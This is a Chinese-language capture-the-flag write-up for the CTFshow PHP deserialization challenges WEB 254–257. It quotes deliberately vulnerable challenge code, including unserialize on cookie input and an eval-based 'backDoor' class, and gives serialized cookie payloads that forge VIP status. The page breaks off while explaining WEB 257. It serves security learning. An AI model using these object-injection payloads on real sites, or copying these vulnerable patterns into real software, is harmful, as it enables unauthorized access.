---
description: 做题记录来了，蓝桥杯快开始了，我还是什么都不会，太酷啦
---

# 💾 CTFSHOW 反序列化

## <mark style="color:blue;background-color:purple;">（1）WEB 254</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}

```

其实这个就是一个对代码理解的题目

### ①代码解释

其实就是接受了username和password，如果两个都存在的话，实例化一个对象user，然后再引用function  login，要让login存在，并且checkvip函数也存在的话，就会引用viponekeygetflag函数。如果login函数要用的话，需要用$username完全等于$u,$password完全等于$p.

### ②思路解释

根据上面的分析，所以我们我们直接传入$username和$password两个结果就可以了。

```url
http://dd78310d-6f85-49a1-a642-ac58a05a72d9.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
```

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



## <mark style="color:blue;background-color:purple;">（2）WEB 255</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}



```

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### ①代码解释

以GET方式传入两个参数username和password，然后对user这个cookie进行反序列化，并且里面username和password需要让他们等于u和p，并且要求isVip等于1，就可以得到flag了。

### ②思路解释

我们知道了三个要求，$username等于$u,$password等于$p,$isVip等于true。

并且需要传入cookie的user和get两个参数。而且user需要时序列化后的结果。

我们首先需要对user进行序列化。我们可以用一个php代码来得到。

```php

<?php

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=true;
}
$a=new ctfShowUser();
echo serialize($a);

?>

```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

得到的结果为

```
O:11:"ctfShowUser":3:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";s:5:"isVip";b:1;}
```

然后我们就可以把他转码之后放到cookie里面了。

```
O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

{% hint style="info" %}
cookie的内容需要url编码
{% endhint %}

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

然后我们的GET里面的参数还是

```
http://e3d28ae1-883e-408a-a621-5799c1ada8fd.challenge.ctf.show/?username=xxxxxx&password=xxxxxx
```

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

得到flag

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>



## <mark style="color:blue;background-color:purple;">（3）WEB 256</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}


```

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### ①代码解释

和上面的差别就是username和password不一样就可以了。

### ②思路解释

我们首先写一个php代码来生成cookie

```php

<?php

class ctfShowUser{
    public $username='123';
    public $password='456';
    public $isVip=true;
}
$a=new ctfShowUser();
echo urlencode(serialize($a));

?>

```

得到的结果是

```
O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22456%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D
```

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

传入GET的结果是

```url
http://65180760-7f41-4368-9d05-130363fbfb54.challenge.ctf.show/?username=123&password=456
```

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;background-color:purple;">(4)WEB 257</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 20:33:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}





```

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### ①代码解释

这个代码比较复杂了家人们，

















































